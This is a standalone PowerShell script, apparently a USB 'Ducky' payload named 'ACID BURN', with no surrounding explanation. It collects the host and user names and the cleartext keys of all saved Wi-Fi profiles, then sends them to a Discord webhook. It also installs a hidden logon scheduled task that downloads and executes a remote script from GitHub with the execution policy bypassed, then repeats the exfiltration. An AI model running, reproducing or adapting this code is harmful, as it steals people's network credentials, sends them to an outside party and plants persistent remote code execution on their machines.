$out = "$env:TEMP\wifi_dump.txt"
"=== ACID BURN ===" | Out-File $out
"Host: $env:COMPUTERNAME" | Out-File $out -Append
"User: $env:USERNAME" | Out-File $out -Append
"" | Out-File $out -Append

$profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}
foreach ($p in $profiles) {
    $details = netsh wlan show profile name="$p" key=clear
    $key = ($details | Select-String "Key Content") -replace ".*:\s*", ""
    if ($key) { "$p : $key" | Out-File $out -Append }
}

$body = Get-Content $out -Raw
$payload = @{ content = $body } | ConvertTo-Json
Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1519137397022130196/X1Pyzeu-cYDoWXpEb5Evo9KFNKgpoeOhdLEsS9NbLWy5gvKkvqeqOZlxuCQV92Xi5XYT" -Method Post -Body $payload -ContentType "application/json"
# --- PERSISTENCE ---
$taskName = "AcidBurn"
$cmd = "powershell -w hidden -ep bypass -c `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/x.ps1')`""

schtasks /create /tn $taskName /tr $cmd /sc onlogon /f 2>$null
try {
    Invoke-RestMethod -Uri "https://discord.com/api/webhooks/..." -Method Post -Body $payload -ContentType "application/json"
} catch {
    $_ | Out-File "$env:TEMP\ab_error.txt"
}
